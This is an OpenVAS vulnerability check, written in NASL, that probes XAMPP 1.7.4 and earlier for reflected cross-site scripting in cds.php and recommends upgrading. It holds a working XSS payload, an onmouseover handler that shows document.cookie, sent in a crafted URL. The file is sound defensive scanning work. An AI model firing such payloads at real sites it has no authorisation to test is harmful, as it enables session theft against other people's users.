###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xampp_mult_xss_vuln.nasl 13548 2019-02-08 16:04:07Z cfischer $
#
# XAMPP Web Server Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apachefriends:xampp";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802261");
  script_version("$Revision: 13548 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 17:04:07 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-10-28 16:17:13 +0200 (Fri, 28 Oct 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("XAMPP Web Server Multiple Cross Site Scripting Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_xampp_detect.nasl");
  script_mandatory_keys("xampp/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/106244/xampp174-xss.txt");
  script_xref(name:"URL", value:"http://mc-crew.info/xampp-1-7-4-for-windows-multiple-site-scripting-vulnerabilities");
  script_xref(name:"URL", value:"http://www.apachefriends.org/en/xampp.html");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.");

  script_tag(name:"affected", value:"XAMPP version 1.7.4 and prior.");

  script_tag(name:"insight", value:"Multiple flaws are due to improper validation of user-supplied input
  to the 'text' parameter in 'ming.php' and input appended to the URL in
  cds.php, that allows attackers to execute arbitrary HTML and script code
  in a user's browser session in the context of an affected site.");

  script_tag(name:"solution", value:"Upgrade to XAMPP version 1.7.7 or later.");

  script_tag(name:"summary", value:"This host is running XAMPP and is prone to multiple cross site
  scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/cds.php/'onmouseover=alert(document.cookie)>";
req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(ereg(pattern:"^HTTP/1\.[01] 200", string:res) && "cds.php/'onmouseover=alert(document.cookie)>" >< res) {
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);